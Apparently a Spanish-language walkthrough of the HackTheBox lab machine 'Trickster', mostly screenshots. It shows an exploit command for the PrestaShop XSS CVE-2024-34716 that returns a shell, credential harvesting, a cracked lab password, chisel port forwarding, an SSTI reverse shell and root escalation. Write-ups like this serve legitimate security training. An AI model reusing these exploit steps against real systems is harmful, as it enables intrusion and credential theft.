![[Pasted image 20250203223628.png]]

![[Pasted image 20250203223657.png]]

```shell
$ sudo nano /etc/hosts

10.10.11.34    trickster.htb
```

## Escaneo de puertos
![[Pasted image 20250203223955.png]]

Descubrimiento del servicio junto con un script basico de vulnerabilidades

![[Pasted image 20250203225222.png]]

#### Descubrimiento del sistema operativo
*Se descubre que la maquina vitima utiliza como sistema operativo un ubuntu Jammy*

![[Pasted image 20250203230143.png]]

## Visualizacion de la pagina web descubierta

![[Pasted image 20250203225352.png]]

Identificación de tecnologías
![[Pasted image 20250203231327.png]]

Se descubre un nuevo subdominio en la pagina *shop.trickter.htb*

![[Pasted image 20250203224110.png]]

Se agrega al */etc/hosts*
```shell
$ sudo nano /etc/hosts

10.10.11.34    trickster.htb    shop.trickster.htb
```

Identificación de tecnologías
![[Pasted image 20250203231527.png]]

#### Visualizacion del subdominio shop.trickster.htb

![[Pasted image 20250203224303.png]]

#### Descubrimiento de directorios
Se descubre directorio *.git* del proyecto, que podemos utilizar para realizar una composición del proyecto y poder llegar a descubrir la estructura de la pagina

![[Pasted image 20250204123328.png]]
Se descubre directorio oculto tras la composición de la pagina web mediante la herramienta *Githack*

![[Pasted image 20250204123449.png]]

## CVE-2024-34716
Al conocer la version de *Prestashop 8.1.5* conocemos que existe un CVE para una vulnerabilidad **XSS**

#### PoC
Utilizamos un recurso de github https://github.com/aelmokhtar/CVE-2024-34716 que automatiza el proceso de explotación por **XSS** lo que nos da como resultado una shell interactiva de la maquina victima.

```shell
$ python3 exploit.py --url http://shop.trickster.htb --email test@test.com --local-ip 10.10.16.17 --admin-path admin534ewutrx1jgitlooaj

...

www-data@trickster:/$ whoami
www-data
```

#### Busqueda de config
Realizamos una busqueda en la configuracion de la pagina en busqueda de usuarios y contrasenas expuestas para poder conectarnos al usuario y escalar nuestros privilegios

Encontramos el archivo */prestashop/app/config/parameters.php* donde presenta un usuario y su contrasena para la base de datos *SQL*

![[Pasted image 20250204143211.png]]

#### Conexión a la base de datos

![[Pasted image 20250204143508.png]]

Descubrimiento de usuarios y contrasenas

![[Pasted image 20250204144856.png]]

#### Rompimiento de contrasenas con hashcat
Se descubre el password de **james** = *alwaysandforever*

![[Pasted image 20250204145608.png]]

![[Pasted image 20250204150038.png]]

## Escalada de privilegios
Localizamos que el servcio de docker esta en curso, debido a que no tenemos permisos con docker, no se pueden visualizar los contenedores o las imagenes.

#### Maquina docker
![[Pasted image 20250206121551.png]]

La maquina *172.17.0.2* esta presente en el sistema, y ademas se logra identificar que su puerto 5000 esta abierto, lo que puede indicar un tipo de servicio como el de *HTTP*

![[Pasted image 20250206121710.png]]

#### Portforwarding con chisel
Nos pasamos chisel en la maquina victima para realizar *Portforwarding* y poder visualizar la pagina desde nuestro host

![[Pasted image 20250206125851.png]]

![[Pasted image 20250206125907.png]]

Con esto se puede visualizar la pagina del contenedor desplegado en docker de la maquina victima

![[Pasted image 20250206130012.png]]

## CVE-2024-32651
Al conocer la version *0.45.20* del servicio *ChangeDetection.io* que esta en el puerto 5000 del contenedor Docker, logramos encontrar una CVE que nos permite explotar un **SSTI**

Configuramos la pagina de nuestro host
```shell
pythom -m http.server 80
```

![[Pasted image 20250206131339.png]]

Modificamos las notificaciones para poder recibir una reverse shell del contenedor
![[Pasted image 20250206131441.png]]

#### Reverse shell
![[Pasted image 20250206131225.png]]

#### Posible recurso con passwords
Se descubren 2 recursos que es posible que contengan passwords de la maquina

![[Pasted image 20250206133614.png]]

Nos pasamos los archivos a la maquina y asi intentar descubrir su contenido

#### Password adam
Se descubre en el recurso un archivo con el contenido del usuario *adam* y su password

![[Pasted image 20250206134741.png]]

![[Pasted image 20250206135316.png]]

## Escalada de privilegios
Se descubre que con el usuario admin se puede ejecutar como root el siguiente binario

![[Pasted image 20250206141824.png]]

Realizamos el exploit para el binario y convertirlo en *SUID* y poder conectarnos como *root*

![[Pasted image 20250206141459.png]]

Nos conectamos como root a la maquina victima

![[Pasted image 20250206141901.png]]